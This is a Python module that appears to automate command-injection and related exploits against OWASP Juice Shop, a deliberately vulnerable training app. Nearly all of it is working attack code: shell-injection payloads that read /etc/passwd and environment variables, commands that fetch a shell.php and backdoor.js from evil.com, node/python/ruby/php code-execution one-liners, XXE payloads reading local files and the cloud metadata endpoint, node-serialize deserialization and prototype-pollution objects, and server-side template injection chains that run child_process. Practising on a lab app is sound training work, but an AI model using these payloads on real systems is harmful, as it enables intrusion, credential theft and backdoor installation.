import logging
import time
import base64
from typing import Dict, List, Any, Optional
from ...core.api_client import JuiceShopAPI
from ...core.browser_automation import BrowserAutomation


class CommandInjectionExploits:
    """
    Command Injection Exploits für OWASP Juice Shop
    """
    
    def __init__(self, api: JuiceShopAPI, browser: Optional[BrowserAutomation] = None):
        self.api = api
        self.browser = browser
        self.logger = logging.getLogger(__name__)
        
    def exploit_basket_manipulation(self) -> Dict[str, Any]:
        """
        Challenge: Manipulate Basket
        Exploit: Command injection via basket item manipulation
        """
        self.logger.info("Exploiting: Basket Manipulation via Command Injection")
        
        # Command injection payloads
        payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; cat package.json",
            "| ps aux",
            "&& node -e \"console.log(process.env)\"",
            "; echo 'pwned'"
        ]
        
        try:
            # First add a normal item to basket
            products = self.api.get_products()
            if products and 'data' in products and products['data']:
                product_id = products['data'][0]['id']
                
                for payload in payloads:
                    try:
                        # Try command injection in quantity field
                        result = self.api._make_request(
                            'POST',
                            '/api/BasketItems/',
                            json={
                                'ProductId': product_id,
                                'BasketId': f"1{payload}",
                                'quantity': 1
                            }
                        )
                        
                        # Check response for command output
                        response_text = result.text
                        if any(indicator in response_text.lower() for indicator in 
                              ['pwned', 'root:', 'node', 'package.json', '/bin/', 'uid=']):
                            self.logger.success(f"Command injection successful: {payload}")
                            return {
                                'success': True,
                                'challenge': 'Basket Manipulation',
                                'payload': payload,
                                'output': response_text
                            }
                            
                    except Exception as e:
                        self.logger.debug(f"Basket payload failed: {payload}")
                        
        except Exception as e:
            self.logger.error(f"Basket manipulation failed: {e}")
            
        return {'success': False, 'challenge': 'Basket Manipulation'}
        
    def exploit_file_write(self) -> Dict[str, Any]:
        """
        Challenge: File Write via Command Injection
        """
        self.logger.info("Exploiting: File Write via Command Injection")
        
        # Payloads to write files
        payloads = [
            "; echo 'PWNED' > /tmp/pwned.txt",
            "| echo 'command injection' > static/pwned.html",
            "&& touch /tmp/hacked",
            "; wget http://evil.com/shell.php -O shell.php",
            "| curl -O http://evil.com/backdoor.js"
        ]
        
        # Try different injection points
        injection_points = [
            '/rest/user/change-password',
            '/profile-image/upload',
            '/file-upload',
            '/api/Complaints'
        ]
        
        for endpoint in injection_points:
            for payload in payloads:
                try:
                    # Different data structures based on endpoint
                    if 'change-password' in endpoint:
                        data = {
                            'current': f"password{payload}",
                            'new': 'newpassword',
                            'repeat': 'newpassword'
                        }
                    elif 'upload' in endpoint:
                        data = {'file': f"image.jpg{payload}"}
                    else:
                        data = {'message': f"complaint{payload}"}
                        
                    response = self.api._make_request('POST', endpoint, json=data)
                    
                    # Check if file was created by trying to access it
                    if 'pwned.html' in payload:
                        check_response = self.api._make_request('GET', '/pwned.html')
                        if check_response.status_code == 200:
                            self.logger.success(f"File write successful: {payload}")
                            return {
                                'success': True,
                                'challenge': 'File Write',
                                'payload': payload,
                                'endpoint': endpoint
                            }
                            
                except Exception as e:
                    self.logger.debug(f"File write payload failed: {payload}")
                    
        return {'success': False, 'challenge': 'File Write'}
        
    def exploit_code_execution(self) -> Dict[str, Any]:
        """
        Challenge: Remote Code Execution
        """
        self.logger.info("Exploiting: Remote Code Execution")
        
        # RCE payloads
        rce_payloads = [
            "; node -e \"require('fs').writeFileSync('pwned.txt', 'RCE Success')\"",
            "| node -p \"process.platform\"",
            "&& node -p \"require('os').userInfo()\"",
            "; python -c \"import os; os.system('echo RCE > /tmp/rce.txt')\"",
            "| ruby -e \"puts 'Ruby RCE'\"",
            "&& php -r \"echo 'PHP RCE';\""
        ]
        
        for payload in rce_payloads:
            try:
                # Try RCE via feedback form
                feedback_data = {
                    'comment': f"Great app{payload}",
                    'rating': 5,
                    'captcha': '1',
                    'captchaId': '1'
                }
                
                response = self.api._make_request('POST', '/api/Feedbacks/', json=feedback_data)
                
                # Check for RCE indicators in response
                response_text = response.text
                if any(indicator in response_text for indicator in 
                      ['RCE', 'process', 'Success', 'userInfo', 'platform']):
                    self.logger.success(f"RCE successful: {payload}")
                    return {
                        'success': True,
                        'challenge': 'Remote Code Execution',
                        'payload': payload,
                        'output': response_text
                    }
                    
                # Try to verify by accessing created file
                if 'pwned.txt' in payload:
                    check_response = self.api._make_request('GET', '/pwned.txt')
                    if 'RCE Success' in check_response.text:
                        return {
                            'success': True,
                            'challenge': 'Remote Code Execution',
                            'payload': payload,
                            'verification': 'File created successfully'
                        }
                        
            except Exception as e:
                self.logger.debug(f"RCE payload failed: {payload}")
                
        return {'success': False, 'challenge': 'Remote Code Execution'}
        
    def exploit_xxe_with_command(self) -> Dict[str, Any]:
        """
        Challenge: XXE + Command Injection
        """
        self.logger.info("Exploiting: XXE with Command Injection")
        
        # XXE payloads that include command injection
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>''',
        ]
        
        for xxe_payload in xxe_payloads:
            try:
                # Try XXE via file upload
                response = self.api._make_request(
                    'POST',
                    '/file-upload',
                    files={'file': ('payload.xml', xxe_payload, 'application/xml')}
                )
                
                response_text = response.text
                if any(indicator in response_text for indicator in 
                      ['root:', 'Linux', 'passwd', 'meta-data']):
                    self.logger.success(f"XXE successful")
                    return {
                        'success': True,
                        'challenge': 'XXE with Command Injection',
                        'payload': xxe_payload,
                        'output': response_text
                    }
                    
            except Exception as e:
                self.logger.debug(f"XXE payload failed")
                
        return {'success': False, 'challenge': 'XXE with Command Injection'}
        
    def exploit_deserialization_rce(self) -> Dict[str, Any]:
        """
        Challenge: Insecure Deserialization leading to RCE
        """
        self.logger.info("Exploiting: Deserialization RCE")
        
        # Node.js deserialization payloads
        deserialization_payloads = [
            # Serialize malicious object
            {"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('echo RCE > /tmp/rce.txt')}()"},
            
            # Prototype pollution
            {"__proto__": {"isAdmin": True, "rce": "console.log('RCE')"}},
            
            # Malicious function serialization
            {"toString": "_$$ND_FUNC$$_function(){return require('fs').readFileSync('/etc/passwd', 'utf8')}"}
        ]
        
        for payload in deserialization_payloads:
            try:
                # Try different endpoints that might deserialize
                endpoints = [
                    '/rest/user/data-export',
                    '/api/Users/',
                    '/rest/user/whoami'
                ]
                
                for endpoint in endpoints:
                    response = self.api._make_request('POST', endpoint, json=payload)
                    
                    response_text = response.text
                    if any(indicator in response_text for indicator in 
                          ['RCE', 'root:', 'passwd', 'admin', 'isAdmin']):
                        self.logger.success(f"Deserialization RCE successful")
                        return {
                            'success': True,
                            'challenge': 'Deserialization RCE',
                            'payload': payload,
                            'endpoint': endpoint,
                            'output': response_text
                        }
                        
            except Exception as e:
                self.logger.debug(f"Deserialization payload failed: {payload}")
                
        return {'success': False, 'challenge': 'Deserialization RCE'}
        
    def exploit_template_injection(self) -> Dict[str, Any]:
        """
        Challenge: Server-Side Template Injection
        """
        self.logger.info("Exploiting: Server-Side Template Injection")
        
        # SSTI payloads for different template engines
        ssti_payloads = [
            # Handlebars
            "{{this.constructor.constructor('return process.env')()}}",
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('whoami');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
            
            # Mustache
            "{{#lambda}}{{>./package.json}}{{/lambda}}",
            
            # Pug/Jade
            "#{7*7}",
            "#{global.process.mainModule.require('child_process').execSync('id')}",
            
            # EJS
            "<%- global.process.mainModule.require('child_process').execSync('whoami') %>",
            
            # Nunjucks
            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('whoami')\")()}}",
        ]
        
        for payload in ssti_payloads:
            try:
                # Try SSTI in different contexts
                contexts = [
                    {'comment': payload, 'rating': 5},  # Feedback
                    {'message': payload},  # Complaints
                    {'name': payload, 'email': 'test@test.com'},  # User registration
                ]
                
                endpoints = [
                    '/api/Feedbacks/',
                    '/api/Complaints/',
                    '/api/Users/'
                ]
                
                for context, endpoint in zip(contexts, endpoints):
                    response = self.api._make_request('POST', endpoint, json=context)
                    
                    response_text = response.text
                    # Check for SSTI indicators
                    if any(indicator in response_text for indicator in 
                          ['49', 'root', 'uid=', 'whoami', 'package.json']):
                        self.logger.success(f"SSTI successful: {payload}")
                        return {
                            'success': True,
                            'challenge': 'Template Injection',
                            'payload': payload,
                            'endpoint': endpoint,
                            'output': response_text
                        }
                        
            except Exception as e:
                self.logger.debug(f"SSTI payload failed: {payload}")
                
        return {'success': False, 'challenge': 'Template Injection'}
        
    def run_all(self) -> List[Dict[str, Any]]:
        """Führt alle Command Injection Exploits aus"""
        exploits = [
            self.exploit_basket_manipulation,
            self.exploit_file_write,
            self.exploit_code_execution,
            self.exploit_xxe_with_command,
            self.exploit_deserialization_rce,
            self.exploit_template_injection
        ]
        
        results = []
        for exploit in exploits:
            try:
                result = exploit()
                results.append(result)
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"Command injection exploit failed: {e}")
                results.append({
                    'success': False,
                    'error': str(e),
                    'exploit': exploit.__name__
                })
                
        return results